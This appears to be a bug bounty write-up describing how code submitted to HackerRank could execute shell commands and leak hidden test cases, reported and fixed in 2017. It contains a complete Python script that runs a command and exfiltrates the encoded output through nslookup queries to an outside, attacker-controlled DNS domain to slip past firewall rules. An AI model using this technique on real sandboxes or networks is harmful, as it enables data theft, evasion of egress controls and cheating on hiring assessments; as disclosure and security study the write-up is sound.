@@ -1,0 +1,75 @@
+# HackerRank bug bounty
+
+## Context
+
+[HackerRank](https://www.hackerrank.com/) is a platform of competitive programming challenges for both consumers and businesses. You basically have a problem statement and you can submit a solution to HackerRank. The website will perform a set of hidden tests on you program to check that it runs correctly. 
+
+HackerRank has a system that requires users to pay to see hidden test cases.
+
+## The bug
+
+It is possible to do network access from the server where the user's code is executed, so it is possible for a user to have a full RCE ex:
+
+```python
+import os
+os.system('ls -la > network')
+```
+
+A full RCE is interesting :D but what can you do with it? After exploring the environment, it looks like it's pretty secure (I won't put details here for the sake of HackerRank). 
+
+But one interesting thing is that you can retrieve all the test cases without paying anything.
+
+HackerRank sells its services to companies. The company designs a problem + the hidden tests then sends it to HackerRank. The candidate then tries to solve the problem (without knowing the hidden cases of course).
+
+Being able to see the hidden tests means that a candidate could hardcode the outputs of its program based on the tests.
+
+## The exploit
+
+A lot of network access was blocked (port 80, 443 even 53), then I remembered a technique called DNS data exfiltration. 
+
+I needed a DNS server which has delegation on its area (dns.hugodelval.com). Then I just had to copy-paste the following exploit in a HackerRank challenge, choose a command (here the command is `ls` but it can also be `cat test`).
+
+```python
+import os
+
+base_dns = 'dns.hugodelval.com'
+command_to_run = 'ls'
+
+os.system("sh -c '" + command_to_run + "|gzip|base64>out.dns'")
+with open('out.dns') as f:
+    data = f.read().replace(' ', '').replace('\n', '').strip()
+
+legal_form = []
+for i in range(0, len(data)//63 + 1):
+    if i*63 <= len(data) - 63:
+        to_add = data[i*63:(i+1)*63]
+    else:
+        to_add = data[i*63:]
+    legal_form.append(to_add)
+
+chunk_len = 252 - len(base_dns)
+
+commands = []
+chunk = ""
+for dns in legal_form:
+    chunk += dns + "."
+    if len(chunk) + 63 > chunk_len:
+        commands.append('nslookup -retry=1 ' + chunk + base_dns)
+        chunk = ""
+commands.append('nslookup -retry=1 ' + chunk + base_dns)
+
+for c in commands:
+    os.system(c)
+```
+
+On the DNS server (dns.hugodelval.com) I launched a `tcpdump port 53` then ran the exploit on the HackerRank challenge.
+
+## Why does DNS data exfiltration works?
+
+This is due to how the DNS protocol works. If the server has an address `A` to resolve its DNS requests, then it will ask this server "do you know the IP of test.dns.hugodelval.com ?". Then the DNS server `A`, which doesn't know the IP address will ask another DNS server and so on... Until it gets to my server. HackerRank had a whitelist on port 53 connection, but this technique bypassed it.
+
+What the exploit does is a DNS request of the form `command | base64`.dns.hugodelval.com which will bypass the firewalls.
+
+## Solution
+
+The IT team solved this issue in 3 days (reported the 7th Nov. 2017 and fixed the 10th)! They disabled DNS lookup altogether.
